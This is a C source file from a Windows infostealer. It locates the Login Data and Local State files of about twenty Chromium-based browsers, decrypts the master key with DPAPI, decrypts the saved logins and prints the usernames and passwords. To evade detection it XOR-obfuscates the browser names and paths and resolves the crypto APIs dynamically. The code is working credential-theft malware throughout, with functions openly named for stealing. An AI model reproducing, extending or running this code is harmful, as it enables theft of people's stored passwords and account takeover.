// clang-format off
// knownfolders needs to be after shlobj
#include <shlobj.h>
#include <knownfolders.h>
// clang-format on

#include "chromium.h"
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <wchar.h>
#include <windows.h>

#include "logins.h"
#include "obfuscation.h"
#include "path.h"

// "DPAPI" is prefixed to the base64 decoded key before encoding
// Meaning we need to remove 5 characters on the key is decoded as it is not
// part of encrypted key
#define DPAPI_KEY_PREFIX_LENGTH 5

// Hardcoded list of chromium browsers, taken from here:
// https://github.com/AlessandroZ/LaZagne/blob/master/Windows/lazagne/softwares/browsers/chromium_browsers.py
// With Opera, Opera GX, SogouExplorer and Yandex removed as they they need
// special handling

// Retreive an encoded (base64) and encrypted (AES-GCM) from the JSON file at
// `localStatePath`
// NOTE: `encodedKeyOut` must be freed by the caller
static int retrieve_encoded_key(PWSTR localStatePath, PSTR *encodedKeyOut) {
  HANDLE fileHandle =
      CreateFileW(localStatePath, GENERIC_READ, FILE_SHARE_READ, NULL,
                  OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  if (fileHandle == INVALID_HANDLE_VALUE) {
    printf("Failed to open file. Error code: %lu\n", GetLastError());
    return EXIT_FAILURE;
  }

  DWORD fileSize = GetFileSize(fileHandle, NULL);
  if (fileSize == INVALID_FILE_SIZE) {
    printf("Failed to get file size. Error code: %lu\n", GetLastError());
    CloseHandle(fileHandle);
    return EXIT_FAILURE;
  }

  // characters in the file are encoded in UTF-8, no need for wide characters
  PSTR fileBuffer = (PSTR)malloc(fileSize + 1);
  if (!fileBuffer) {
    printf("Failed to allocate memory for file buffer.\n");
    CloseHandle(fileHandle);
    return EXIT_FAILURE;
  }

  DWORD bytesRead;
  if (!ReadFile(fileHandle, fileBuffer, fileSize * sizeof(char), &bytesRead,
                NULL)) {
    printf("Failed to read file. Error code: %lu\n", GetLastError());
    free(fileBuffer);
    CloseHandle(fileHandle);
    return EXIT_FAILURE;
  }
  CloseHandle(fileHandle);

  fileBuffer[fileSize] = '\0';

  // Search for the "encryped_key:" attribute
  const char *key = "\"encrypted_key\":";
  PSTR cursor = strstr(fileBuffer, key);
  if (!cursor) {
    free(fileBuffer);
    return EXIT_FAILURE;
  }

  // skip the key
  cursor += strlen(key);
  // skip whitespace and the beginning quote
  while (*cursor == ' ' || *cursor == '\t' || *cursor == '"') {
    cursor++;
  }

  // keep start position of the encrypted key
  PSTR start = cursor;
  // cursor now points to the end of the encrypted key (to get the length)
  while (*cursor != '"') {
    cursor++;
  }

  size_t length = cursor - start;
  *encodedKeyOut = (PSTR)malloc(length + 1);
  if (!*encodedKeyOut) {
    free(fileBuffer);
    return EXIT_FAILURE;
  }

  strncpy(*encodedKeyOut, start, length);
  (*encodedKeyOut)[length] = '\0';

  free(fileBuffer);
  return EXIT_SUCCESS;
}

// Decodes a base64 `encodedKey` (also cleans the key) into `decodedKeyOut`,
// note that `decodedKeyOut` is still encrypted at this point
// NOTE: `decodedKeyOut` must be freed by the caller
static int decode_key(PSTR encodedKey, BYTE *decodedKeyOut[],
                      size_t *decodedKeySizeOut, hidden_apis *apis) {
  // Get size of the decoded key (needed for the next malloc)
  DWORD decodedBinarySize = 0;
  if (!apis->funcCryptStringToBinaryA(encodedKey, 0, CRYPT_STRING_BASE64, NULL,
                                      &decodedBinarySize, NULL, NULL)) {
    fprintf(stderr, "Failed getting base64 size. Error code: %lu\n",
            GetLastError());
    return EXIT_FAILURE;
  }

  BYTE *decodedBinaryData = (BYTE *)malloc(decodedBinarySize);
  if (decodedBinaryData == NULL) {
    fprintf(stderr, "Failed allocating memory\n");
    return EXIT_FAILURE;
  }

  // Decode the encoded key, this leaves us with an AES-GCM encrypted key
  if (!apis->funcCryptStringToBinaryA(encodedKey, 0, CRYPT_STRING_BASE64,
                                    decodedBinaryData, &decodedBinarySize, NULL,
                                    NULL)) {
    fprintf(stderr, "Failed decoding base64. Error code: %lu\n",
            GetLastError());
    free(decodedBinaryData);
    return EXIT_FAILURE;
  }

  // Remove the first five bytes (corresponding to "DPAPI") as they are not part
  // of the key
  size_t newSize = decodedBinarySize - DPAPI_KEY_PREFIX_LENGTH;
  memmove(decodedBinaryData, decodedBinaryData + DPAPI_KEY_PREFIX_LENGTH,
          newSize);

  *decodedKeyOut = (BYTE *)realloc(decodedBinaryData, newSize);
  if (*decodedKeyOut == NULL) {
    fprintf(stderr, "Failed reallocating memory\n");
    free(decodedBinaryData);
    return EXIT_FAILURE;
  }

  *decodedKeySizeOut = newSize;

  return EXIT_SUCCESS;
}

// Decrypts `encryptedKey` of size `encryptedKeySize` using DPAPI
// NOTE: `decryptedKeyOut` must be freed by the caller
static int decrypt_key(BYTE encryptedKey[], size_t encryptedKeySize,
                       DATA_BLOB *decryptedKeyOut, hidden_apis *apis) {
  DATA_BLOB DataInput;
  DATA_BLOB DataOutput;

  DataInput.cbData = (DWORD)encryptedKeySize;
  DataInput.pbData = encryptedKey;

  if (!apis->funcCryptUnprotectData(&DataInput, NULL, NULL, NULL, NULL, 0, &DataOutput)) {
    fprintf(stderr, "Failed decrypting key. Error code: %lu\n", GetLastError());
    free(encryptedKey);
    return EXIT_FAILURE;
  }

  decryptedKeyOut->cbData = DataOutput.cbData;
  decryptedKeyOut->pbData = DataOutput.pbData;

  // we could free encryptedKey here but I rather leave it to the original
  // caller
  // free(encryptedKey);
  return EXIT_SUCCESS;
}

// Steals credentials for a singular `browser`
static int steal_browser_creds(BrowserInfo browser) {
  // login data contains each logins with the password encrypted and other
  // attributes in clear text

  // Obfuscate browser strings
  // wcslen() is the equivalent of strlen() for wide strings
  XOR_WSTR(browser.browserName, wcslen(browser.browserName));
  XOR_WSTR(browser.loginDataPath, wcslen(browser.loginDataPath));
  XOR_WSTR(browser.localStatePath, wcslen(browser.localStatePath));
#ifdef DEBUG
  wprintf(L"steal_browser-creds - Values after XOR : %ls, %ls, %ls\n",
          browser.browserName, browser.loginDataPath, browser.localStatePath);
#endif
  wprintf(L"Browser name = %ls\n", browser.browserName);
  // wprintf(L"Login data path = %ls\n", browser.loginDataPath);
  // wprintf(L"Local state path = %ls\n", browser.localStatePath);
  /*
    printf("\nName : %llu\n", wcslen(browser.browserName));
    printf("Data path : %llu\n", wcslen(browser.loginDataPath));
    printf("State path : %llu\n\n", wcslen(browser.localStatePath));
  */
  PWSTR loginDataPath;
  if (get_logindata_path(browser.loginDataPath, &loginDataPath) !=
      EXIT_SUCCESS) {
    fwprintf(stderr, L"Unable to get login data PATH for %ls\n",
             browser.browserName);
    return EXIT_FAILURE;
  }

  wprintf(L"=== Now stealing %ls credentials ===\n", browser.browserName);

  Login *logins = NULL;
  int loginsCount = 0;
  if (chrmm_retrieve_logins(loginDataPath, &loginsCount, &logins) !=
      EXIT_SUCCESS) {
    fprintf(stderr, "Could not retrieve logins from the database\n");
    return EXIT_FAILURE;
  }

  // local state contains and encoded and decrypted key that once decrypted
  // can decrypt a logins password with AES-GCM
  PWSTR localStatePath;
  if (get_localstate_path(browser.localStatePath, &localStatePath) !=
      EXIT_SUCCESS) {
    fwprintf(stderr, L"Unable to get local state PATH for %ls\n",
             browser.browserName);
    return EXIT_FAILURE;
  }

  PSTR encodedKey;
  if (retrieve_encoded_key(localStatePath, &encodedKey) != EXIT_SUCCESS) {
    wprintf(L"Could not retrieve key from %ls\n", localStatePath);
    return EXIT_FAILURE;
  }
  // dynamic resol
  hidden_apis apis;
  resolve_apis(&apis);

  size_t encryptedKeySize = 0;
  BYTE *encryptedKey;
  if (decode_key(encodedKey, &encryptedKey, &encryptedKeySize,&apis) !=
      EXIT_SUCCESS) {
    printf("Could not decode %ls\n", encodedKey);
    return EXIT_FAILURE;
  }
  
  DATA_BLOB decryptedBlob;
  if (decrypt_key(encryptedKey, encryptedKeySize, &decryptedBlob,&apis) !=
      EXIT_SUCCESS) {
    fprintf(stderr, "Could not decrypt key\n");
    return EXIT_FAILURE;
  }

  Credential *credentials = NULL;
  int credentialsCount = 0;
  if (chrmm_decrypt_logins(logins, loginsCount, decryptedBlob.pbData,
                           &credentials, &credentialsCount) != EXIT_SUCCESS) {
    printf("Failed to decrypt chromium logins\n");
  }

  for (int i = 0; i < credentialsCount; i++) {
    printf("======LOGIN %d======\n", i + 1);
    printCredential(credentials[i]);
  }
  printf("====================\n");

  free_credentials(credentials, credentialsCount);
  free_logins(logins, loginsCount);  // allocated in chrmm_retrieve_logins
  LocalFree(decryptedBlob.pbData);   // allocated in decrypt_key
  free(encodedKey);                  // allocated in retrieve_encoded_key
  free(encryptedKey);                // allocated in decode_key
  free(localStatePath);              // allocated in get_localstate_path
  free(loginDataPath);               // allocated in get_logindata_path

  return EXIT_SUCCESS;
}

int steal_chromium_creds() {
  /* BrowserInfo browsers[] = {
      {L"7Star", L"\\7Star\\7Star\\User Data\\Default\\Login Data",
       L"\\7Star\\7Star\\User Data\\Local State"},
      {L"Amigo", L"\\Amigo\\User Data\\Default\\Login Data",
       L"\\Amigo\\User Data\\Local State"},
      {L"Brave",
       L"\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data",
       L"\\BraveSoftware\\Brave-Browser\\User Data\\Local State"},
      {L"CentBrowser", L"\\CentBrowser\\User Data\\Default\\Login Data",
       L"\\CentBrowser\\User Data\\Local State"},
      {L"Chedot", L"\\Chedot\\User Data\\Default\\Login Data",
       L"\\Chedot\\User Data\\Local State"},
      {L"Chrome Beta", L"\\Google\\Chrome Beta\\User Data\\Default\\Login Data",
       L"\\Google\\Chrome Beta\\User Data\\Local State"},
      {L"Chrome Canary",
       L"\\Google\\Chrome SxS\\User Data\\Default\\Login Data",
       L"\\Google\\Chrome SxS\\User Data\\Local State"},
      {L"Chromium", L"\\Chromium\\User Data\\Default\\Login Data",
       L"\\Chromium\\User Data\\Local State"},
      {L"Microsoft Edge", L"\\Microsoft\\Edge\\User Data\\Default\\Login Data",
       L"\\Microsoft\\Edge\\User Data\\Local State"},
      {L"CocCoc", L"\\CocCoc\\Browser\\User Data\\Default\\Login Data",
       L"\\CocCoc\\Browser\\User Data\\Local State"},
      {L"Comodo Dragon", L"\\Comodo\\Dragon\\User Data\\Default\\Login Data",
       L"\\Comodo\\Dragon\\User Data\\Local State"},
      {L"Elements Browser",
       L"\\Elements Browser\\User Data\\Default\\Login Data",
       L"\\Elements Browser\\User Data\\Local State"},
      {L"DCBrowser", L"\\DCBrowser\\User Data\\Default\\Login Data",
       L"\\DCBrowser\\User Data\\Local State"},
      {L"Epic Privacy Browser",
       L"\\Epic Privacy Browser\\User Data\\Default\\Login Data",
       L"\\Epic Privacy Browser\\User Data\\Local State"},
      {L"Google Chrome", L"\\Google\\Chrome\\User Data\\Default\\Login Data",
       L"\\Google\\Chrome\\User Data\\Local State"},
      {L"Kometa", L"\\Kometa\\User Data\\Default\\Login Data",
       L"\\Kometa\\User Data\\Local State"},
      {L"Orbitum", L"\\Orbitum\\User Data\\Default\\Login Data",
       L"\\Orbitum\\User Data\\Local State"},
      {L"QQBrowser", L"\\Tencent\\QQBrowser\\User Data\\Default\\Login Data",
       L"\\Tencent\\QQBrowser\\User Data\\Local State"},
      {L"Sputnik", L"\\Sputnik\\Sputnik\\User Data\\Default\\Login Data",
       L"\\Sputnik\\Sputnik\\User Data\\Local State"},
      {L"Torch", L"\\Torch\\User Data\\Default\\Login Data",
       L"\\Torch\\User Data\\Local State"},
      {L"Uran", L"\\uCozMedia\\Uran\\User Data\\Default\\Login Data",
       L"\\uCozMedia\\Uran\\User Data\\Local State"},
      {L"Vivaldi", L"\\Vivaldi\\User Data\\Default\\Login Data",
       L"\\Vivaldi\\User Data\\Local State"},
  };*/

  BrowserInfo browsers[] = {
      {L"\x1d\x79\x5e\x4b\x58",
       L"\x76\x1d\x79\x5e\x4b\x58\x76\x1d\x79\x5e\x4b\x58\x76\x7f\x59\x4f\x58"
       L"\x0a\x6e\x4b\x5e\x4b\x76\x6e\x4f\x4c\x4b\x5f\x46\x5e\x76\x66\x45\x4d"
       L"\x43\x44\x0a\x6e\x4b\x5e\x4b",
       L"\x76\x1d\x79\x5e\x4b\x58\x76\x1d\x79\x5e\x4b\x58\x76\x7f\x59\x4f\x58"
       L"\x0a\x6e\x4b\x5e\x4b\x76\x66\x45\x49\x4b\x46\x0a\x79\x5e\x4b\x5e\x4f"},
      {L"\x6b\x47\x43\x4d\x45",
       L"\x76\x6b\x47\x43\x4d\x45\x76\x7f\x59\x4f\x58\x0a\x6e\x4b\x5e\x4b\x76"
       L"\x6e\x4f\x4c\x4b\x5f\x46\x5e\x76\x66\x45\x4d\x43\x44\x0a\x6e\x4b\x5e"
       L"\x4b",
       L"\x76\x6b\x47\x43\x4d\x45\x76\x7f\x59\x4f\x58\x0a\x6e\x4b\x5e\x4b\x76"
       L"\x66\x45\x49\x4b\x46\x0a\x79\x5e\x4b\x5e\x4f"},
      {L"\x68\x58\x4b\x5c\x4f",
       L"\x76\x68\x58\x4b\x5c\x4f\x79\x45\x4c\x5e\x5d\x4b\x58\x4f\x76\x68\x58"
       L"\x4b\x5c\x4f\x07\x68\x58\x45\x5d\x59\x4f\x58\x76\x7f\x59\x4f\x58\x0a"
       L"\x6e\x4b\x5e\x4b\x76\x6e\x4f\x4c\x4b\x5f\x46\x5e\x76\x66\x45\x4d\x43"
       L"\x44\x0a\x6e\x4b\x5e\x4b",
       L"\x76\x68\x58\x4b\x5c\x4f\x79\x45\x4c\x5e\x5d\x4b\x58\x4f\x76\x68\x58"
       L"\x4b\x5c\x4f\x07\x68\x58\x45\x5d\x59\x4f\x58\x76\x7f\x59\x4f\x58\x0a"
       L"\x6e\x4b\x5e\x4b\x76\x66\x45\x49\x4b\x46\x0a\x79\x5e\x4b\x5e\x4f"},
      {L"\x69\x4f\x44\x5e\x68\x58\x45\x5d\x59\x4f\x58",
       L"\x76\x69\x4f\x44\x5e\x68\x58\x45\x5d\x59\x4f\x58\x76\x7f\x59\x4f\x58"
       L"\x0a\x6e\x4b\x5e\x4b\x76\x6e\x4f\x4c\x4b\x5f\x46\x5e\x76\x66\x45\x4d"
       L"\x43\x44\x0a\x6e\x4b\x5e\x4b",
       L"\x76\x69\x4f\x44\x5e\x68\x58\x45\x5d\x59\x4f\x58\x76\x7f\x59\x4f\x58"
       L"\x0a\x6e\x4b\x5e\x4b\x76\x66\x45\x49\x4b\x46\x0a\x79\x5e\x4b\x5e\x4f"},
      {L"\x69\x42\x4f\x4e\x45\x5e",
       L"\x76\x69\x42\x4f\x4e\x45\x5e\x76\x7f\x59\x4f\x58\x0a\x6e\x4b\x5e\x4b"
       L"\x76\x6e\x4f\x4c\x4b\x5f\x46\x5e\x76\x66\x45\x4d\x43\x44\x0a\x6e\x4b"
       L"\x5e\x4b",
       L"\x76\x69\x42\x4f\x4e\x45\x5e\x76\x7f\x59\x4f\x58\x0a\x6e\x4b\x5e\x4b"
       L"\x76\x66\x45\x49\x4b\x46\x0a\x79\x5e\x4b\x5e\x4f"},
      {L"\x69\x42\x58\x45\x47\x4f\x0a\x68\x4f\x5e\x4b",
       L"\x76\x6d\x45\x45\x4d\x46\x4f\x76\x69\x42\x58\x45\x47\x4f\x0a\x68\x4f"
       L"\x5e\x4b\x76\x7f\x59\x4f\x58\x0a\x6e\x4b\x5e\x4b\x76\x6e\x4f\x4c\x4b"
       L"\x5f\x46\x5e\x76\x66\x45\x4d\x43\x44\x0a\x6e\x4b\x5e\x4b",
       L"\x76\x6d\x45\x45\x4d\x46\x4f\x76\x69\x42\x58\x45\x47\x4f\x0a\x68\x4f"
       L"\x5e\x4b\x76\x7f\x59\x4f\x58\x0a\x6e\x4b\x5e\x4b\x76\x66\x45\x49\x4b"
       L"\x46\x0a\x79\x5e\x4b\x5e\x4f"},
      {L"\x69\x42\x58\x45\x47\x4f\x0a\x69\x4b\x44\x4b\x58\x53",
       L"\x76\x6d\x45\x45\x4d\x46\x4f\x76\x69\x42\x58\x45\x47\x4f\x0a\x79\x52"
       L"\x79\x76\x7f\x59\x4f\x58\x0a\x6e\x4b\x5e\x4b\x76\x6e\x4f\x4c\x4b\x5f"
       L"\x46\x5e\x76\x66\x45\x4d\x43\x44\x0a\x6e\x4b\x5e\x4b",
       L"\x76\x6d\x45\x45\x4d\x46\x4f\x76\x69\x42\x58\x45\x47\x4f\x0a\x79\x52"
       L"\x79\x76\x7f\x59\x4f\x58\x0a\x6e\x4b\x5e\x4b\x76\x66\x45\x49\x4b\x46"
       L"\x0a\x79\x5e\x4b\x5e\x4f"},
      {L"\x69\x42\x58\x45\x47\x43\x5f\x47",
       L"\x76\x69\x42\x58\x45\x47\x43\x5f\x47\x76\x7f\x59\x4f\x58\x0a\x6e\x4b"
       L"\x5e\x4b\x76\x6e\x4f\x4c\x4b\x5f\x46\x5e\x76\x66\x45\x4d\x43\x44\x0a"
       L"\x6e\x4b\x5e\x4b",
       L"\x76\x69\x42\x58\x45\x47\x43\x5f\x47\x76\x7f\x59\x4f\x58\x0a\x6e\x4b"
       L"\x5e\x4b\x76\x66\x45\x49\x4b\x46\x0a\x79\x5e\x4b\x5e\x4f"},
      {L"\x67\x43\x49\x58\x45\x59\x45\x4c\x5e\x0a\x6f\x4e\x4d\x4f",
       L"\x76\x67\x43\x49\x58\x45\x59\x45\x4c\x5e\x76\x6f\x4e\x4d\x4f\x76\x7f"
       L"\x59\x4f\x58\x0a\x6e\x4b\x5e\x4b\x76\x6e\x4f\x4c\x4b\x5f\x46\x5e\x76"
       L"\x66\x45\x4d\x43\x44\x0a\x6e\x4b\x5e\x4b",
       L"\x76\x67\x43\x49\x58\x45\x59\x45\x4c\x5e\x76\x6f\x4e\x4d\x4f\x76\x7f"
       L"\x59\x4f\x58\x0a\x6e\x4b\x5e\x4b\x76\x66\x45\x49\x4b\x46\x0a\x79\x5e"
       L"\x4b\x5e\x4f"},
      {L"\x69\x45\x49\x69\x45\x49",
       L"\x76\x69\x45\x49\x69\x45\x49\x76\x68\x58\x45\x5d\x59\x4f\x58\x76\x7f"
       L"\x59\x4f\x58\x0a\x6e\x4b\x5e\x4b\x76\x6e\x4f\x4c\x4b\x5f\x46\x5e\x76"
       L"\x66\x45\x4d\x43\x44\x0a\x6e\x4b\x5e\x4b",
       L"\x76\x69\x45\x49\x69\x45\x49\x76\x68\x58\x45\x5d\x59\x4f\x58\x76\x7f"
       L"\x59\x4f\x58\x0a\x6e\x4b\x5e\x4b\x76\x66\x45\x49\x4b\x46\x0a\x79\x5e"
       L"\x4b\x5e\x4f"},
      {L"\x69\x45\x47\x45\x4e\x45\x0a\x6e\x58\x4b\x4d\x45\x44",
       L"\x76\x69\x45\x47\x45\x4e\x45\x76\x6e\x58\x4b\x4d\x45\x44\x76\x7f\x59"
       L"\x4f\x58\x0a\x6e\x4b\x5e\x4b\x76\x6e\x4f\x4c\x4b\x5f\x46\x5e\x76\x66"
       L"\x45\x4d\x43\x44\x0a\x6e\x4b\x5e\x4b",
       L"\x76\x69\x45\x47\x45\x4e\x45\x76\x6e\x58\x4b\x4d\x45\x44\x76\x7f\x59"
       L"\x4f\x58\x0a\x6e\x4b\x5e\x4b\x76\x66\x45\x49\x4b\x46\x0a\x79\x5e\x4b"
       L"\x5e\x4f"},
      {L"\x6f\x46\x4f\x47\x4f\x44\x5e\x59\x0a\x68\x58\x45\x5d\x59\x4f\x58",
       L"\x76\x6f\x46\x4f\x47\x4f\x44\x5e\x59\x0a\x68\x58\x45\x5d\x59\x4f\x58"
       L"\x76\x7f\x59\x4f\x58\x0a\x6e\x4b\x5e\x4b\x76\x6e\x4f\x4c\x4b\x5f\x46"
       L"\x5e\x76\x66\x45\x4d\x43\x44\x0a\x6e\x4b\x5e\x4b",
       L"\x76\x6f\x46\x4f\x47\x4f\x44\x5e\x59\x0a\x68\x58\x45\x5d\x59\x4f\x58"
       L"\x76\x7f\x59\x4f\x58\x0a\x6e\x4b\x5e\x4b\x76\x66\x45\x49\x4b\x46\x0a"
       L"\x79\x5e\x4b\x5e\x4f"},
      {L"\x6e\x69\x68\x58\x45\x5d\x59\x4f\x58",
       L"\x76\x6e\x69\x68\x58\x45\x5d\x59\x4f\x58\x76\x7f\x59\x4f\x58\x0a\x6e"
       L"\x4b\x5e\x4b\x76\x6e\x4f\x4c\x4b\x5f\x46\x5e\x76\x66\x45\x4d\x43\x44"
       L"\x0a\x6e\x4b\x5e\x4b",
       L"\x76\x6e\x69\x68\x58\x45\x5d\x59\x4f\x58\x76\x7f\x59\x4f\x58\x0a\x6e"
       L"\x4b\x5e\x4b\x76\x66\x45\x49\x4b\x46\x0a\x79\x5e\x4b\x5e\x4f"},
      {L"\x6f\x5a\x43\x49\x0a\x7a\x58\x43\x5c\x4b\x49\x53\x0a\x68\x58\x45\x5d"
       L"\x59\x4f\x58",
       L"\x76\x6f\x5a\x43\x49\x0a\x7a\x58\x43\x5c\x4b\x49\x53\x0a\x68\x58\x45"
       L"\x5d\x59\x4f\x58\x76\x7f\x59\x4f\x58\x0a\x6e\x4b\x5e\x4b\x76\x6e\x4f"
       L"\x4c\x4b\x5f\x46\x5e\x76\x66\x45\x4d\x43\x44\x0a\x6e\x4b\x5e\x4b",
       L"\x76\x6f\x5a\x43\x49\x0a\x7a\x58\x43\x5c\x4b\x49\x53\x0a\x68\x58\x45"
       L"\x5d\x59\x4f\x58\x76\x7f\x59\x4f\x58\x0a\x6e\x4b\x5e\x4b\x76\x66\x45"
       L"\x49\x4b\x46\x0a\x79\x5e\x4b\x5e\x4f"},
      {L"\x6d\x45\x45\x4d\x46\x4f\x0a\x69\x42\x58\x45\x47\x4f",
       L"\x76\x6d\x45\x45\x4d\x46\x4f\x76\x69\x42\x58\x45\x47\x4f\x76\x7f\x59"
       L"\x4f\x58\x0a\x6e\x4b\x5e\x4b\x76\x6e\x4f\x4c\x4b\x5f\x46\x5e\x76\x66"
       L"\x45\x4d\x43\x44\x0a\x6e\x4b\x5e\x4b",
       L"\x76\x6d\x45\x45\x4d\x46\x4f\x76\x69\x42\x58\x45\x47\x4f\x76\x7f\x59"
       L"\x4f\x58\x0a\x6e\x4b\x5e\x4b\x76\x66\x45\x49\x4b\x46\x0a\x79\x5e\x4b"
       L"\x5e\x4f"},
      {L"\x61\x45\x47\x4f\x5e\x4b",
       L"\x76\x61\x45\x47\x4f\x5e\x4b\x76\x7f\x59\x4f\x58\x0a\x6e\x4b\x5e\x4b"
       L"\x76\x6e\x4f\x4c\x4b\x5f\x46\x5e\x76\x66\x45\x4d\x43\x44\x0a\x6e\x4b"
       L"\x5e\x4b",
       L"\x76\x61\x45\x47\x4f\x5e\x4b\x76\x7f\x59\x4f\x58\x0a\x6e\x4b\x5e\x4b"
       L"\x76\x66\x45\x49\x4b\x46\x0a\x79\x5e\x4b\x5e\x4f"},
      {L"\x65\x58\x48\x43\x5e\x5f\x47",
       L"\x76\x65\x58\x48\x43\x5e\x5f\x47\x76\x7f\x59\x4f\x58\x0a\x6e\x4b\x5e"
       L"\x4b\x76\x6e\x4f\x4c\x4b\x5f\x46\x5e\x76\x66\x45\x4d\x43\x44\x0a\x6e"
       L"\x4b\x5e\x4b",
       L"\x76\x65\x58\x48\x43\x5e\x5f\x47\x76\x7f\x59\x4f\x58\x0a\x6e\x4b\x5e"
       L"\x4b\x76\x66\x45\x49\x4b\x46\x0a\x79\x5e\x4b\x5e\x4f"},
      {L"\x7b\x7b\x68\x58\x45\x5d\x59\x4f\x58",
       L"\x76\x7e\x4f\x44\x49\x4f\x44\x5e\x76\x7b\x7b\x68\x58\x45\x5d\x59\x4f"
       L"\x58\x76\x7f\x59\x4f\x58\x0a\x6e\x4b\x5e\x4b\x76\x6e\x4f\x4c\x4b\x5f"
       L"\x46\x5e\x76\x66\x45\x4d\x43\x44\x0a\x6e\x4b\x5e\x4b",
       L"\x76\x7e\x4f\x44\x49\x4f\x44\x5e\x76\x7b\x7b\x68\x58\x45\x5d\x59\x4f"
       L"\x58\x76\x7f\x59\x4f\x58\x0a\x6e\x4b\x5e\x4b\x76\x66\x45\x49\x4b\x46"
       L"\x0a\x79\x5e\x4b\x5e\x4f"},
      {L"\x79\x5a\x5f\x5e\x44\x43\x41",
       L"\x76\x79\x5a\x5f\x5e\x44\x43\x41\x76\x79\x5a\x5f\x5e\x44\x43\x41\x76"
       L"\x7f\x59\x4f\x58\x0a\x6e\x4b\x5e\x4b\x76\x6e\x4f\x4c\x4b\x5f\x46\x5e"
       L"\x76\x66\x45\x4d\x43\x44\x0a\x6e\x4b\x5e\x4b",
       L"\x76\x79\x5a\x5f\x5e\x44\x43\x41\x76\x79\x5a\x5f\x5e\x44\x43\x41\x76"
       L"\x7f\x59\x4f\x58\x0a\x6e\x4b\x5e\x4b\x76\x66\x45\x49\x4b\x46\x0a\x79"
       L"\x5e\x4b\x5e\x4f"},
      {L"\x7e\x45\x58\x49\x42",
       L"\x76\x7e\x45\x58\x49\x42\x76\x7f\x59\x4f\x58\x0a\x6e\x4b\x5e\x4b\x76"
       L"\x6e\x4f\x4c\x4b\x5f\x46\x5e\x76\x66\x45\x4d\x43\x44\x0a\x6e\x4b\x5e"
       L"\x4b",
       L"\x76\x7e\x45\x58\x49\x42\x76\x7f\x59\x4f\x58\x0a\x6e\x4b\x5e\x4b\x76"
       L"\x66\x45\x49\x4b\x46\x0a\x79\x5e\x4b\x5e\x4f"},
      {L"\x7f\x58\x4b\x44",
       L"\x76\x5f\x69\x45\x50\x67\x4f\x4e\x43\x4b\x76\x7f\x58\x4b\x44\x76\x7f"
       L"\x59\x4f\x58\x0a\x6e\x4b\x5e\x4b\x76\x6e\x4f\x4c\x4b\x5f\x46\x5e\x76"
       L"\x66\x45\x4d\x43\x44\x0a\x6e\x4b\x5e\x4b",
       L"\x76\x5f\x69\x45\x50\x67\x4f\x4e\x43\x4b\x76\x7f\x58\x4b\x44\x76\x7f"
       L"\x59\x4f\x58\x0a\x6e\x4b\x5e\x4b\x76\x66\x45\x49\x4b\x46\x0a\x79\x5e"
       L"\x4b\x5e\x4f"},
      {L"\x7c\x43\x5c\x4b\x46\x4e\x43",
       L"\x76\x7c\x43\x5c\x4b\x46\x4e\x43\x76\x7f\x59\x4f\x58\x0a\x6e\x4b\x5e"
       L"\x4b\x76\x6e\x4f\x4c\x4b\x5f\x46\x5e\x76\x66\x45\x4d\x43\x44\x0a\x6e"
       L"\x4b\x5e\x4b",
       L"\x76\x7c\x43\x5c\x4b\x46\x4e\x43\x76\x7f\x59\x4f\x58\x0a\x6e\x4b\x5e"
       L"\x4b\x76\x66\x45\x49\x4b\x46\x0a\x79\x5e\x4b\x5e\x4f"},
  };

  for (int i = 0; i < sizeof(browsers) / sizeof(BrowserInfo); i++) {
    if (steal_browser_creds(browsers[i]) != EXIT_SUCCESS) {
      fwprintf(stderr, L"Unable to find credentials for %ls. Continuing...\n",
               browsers[i].browserName);
    }
  }
  return EXIT_SUCCESS;
}
